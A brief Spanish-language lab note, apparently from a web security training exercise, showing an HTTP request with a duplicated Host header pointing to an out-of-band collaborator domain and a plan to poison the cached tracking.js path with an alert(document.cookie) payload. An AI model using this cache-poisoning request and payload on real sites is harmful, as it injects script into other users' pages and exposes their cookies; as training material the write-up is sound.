Nos tira 200 OK y vemos la segunda cabecera Host reflejada en muchos sitios
```HTTP
GET /login HTTP/1.1
Host: 0a48006204eae382846fb90000a600dc.h1-web-security-academy.net
Host: wvv5qww5rhbs8njejymz2pr7mysvgmfa4.oastify.com
```

Nos llega una peticion para cargar el recurso :

```
/resources/js/tracking.js
```

Sería envenenar la segunda cabecera Host con el dominio del exploit server y hostear en esa ruta alert(document.cookie)